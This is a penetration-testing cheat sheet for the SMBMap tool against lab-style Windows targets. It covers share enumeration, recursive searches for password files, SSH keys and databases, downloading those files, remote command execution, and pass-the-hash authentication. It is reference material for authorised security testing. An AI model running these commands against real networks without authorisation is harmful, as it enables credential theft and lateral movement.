# smbmap

SMBMap is a tool for enumerating SMB shares and permissions on Windows networks. It's particularly useful during penetration tests for identifying accessible shares, searching for sensitive files, and testing credential access across multiple hosts.

## Basic Enumeration

Enumerate for read access to network shares:

`python3 ./smbmap.py -u <user> -p <pass> -d burmat.local --host-file /root/scans/smbhosts.txt --no-write-check -r --csv /root/recon/shares.csv`

## Common Usage Scenarios

### Null Session Enumeration

Test for anonymous/null session access:

```bash
smbmap -H 10.10.10.123
smbmap -H 10.10.10.123 -u '' -p ''
```

### Authenticated Enumeration

With valid credentials:

```bash
smbmap -H 10.10.10.123 -u jsmith -p 'Password123' -d burmat.local
```

### Recursive Share Enumeration

Recursively list all directories and files:

```bash
smbmap -H 10.10.10.123 -u jsmith -p 'Password123' -d burmat.local -R
smbmap -H 10.10.10.123 -u jsmith -p 'Password123' -d burmat.local -R 'C$'
```

### Search for Sensitive Files

Search for files matching specific patterns:

{% code overflow="wrap" %}
```bash
# Search for common sensitive files
smbmap -H 10.10.10.123 -u jsmith -p 'Password123' -d burmat.local -R --pattern '*.txt|*.xml|*.ini|*.conf'

# Search for passwords
smbmap -H 10.10.10.123 -u jsmith -p 'Password123' -d burmat.local -R --pattern 'pass*'

# Search for SSH keys
smbmap -H 10.10.10.123 -u jsmith -p 'Password123' -d burmat.local -R --pattern 'id_rsa*'

# Search for database files
smbmap -H 10.10.10.123 -u jsmith -p 'Password123' -d burmat.local -R --pattern '*.sql|*.db|*.mdb'
```
{% endcode %}

### Download Files

Download specific files from shares:

```bash
# Download a specific file
smbmap -H 10.10.10.123 -u jsmith -p 'Password123' -d burmat.local --download 'C$\temp\passwords.txt'

# Download all files matching pattern
smbmap -H 10.10.10.123 -u jsmith -p 'Password123' -d burmat.local -R --download-pattern '*.config'
```

### Execute Commands

Execute commands on remote systems (requires admin privileges):

```bash
smbmap -H 10.10.10.123 -u administrator -p 'AdminPass123' -d burmat.local -x 'whoami'
smbmap -H 10.10.10.123 -u administrator -p 'AdminPass123' -d burmat.local -x 'ipconfig /all'
```

### Mass Enumeration

Enumerate multiple hosts from a file:

```bash
smbmap -u jsmith -p 'Password123' -d burmat.local --host-file targets.txt
```

### Pass-the-Hash

Use NTLM hash instead of password:

```bash
smbmap -H 10.10.10.123 -u administrator -d burmat.local --hash 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
```
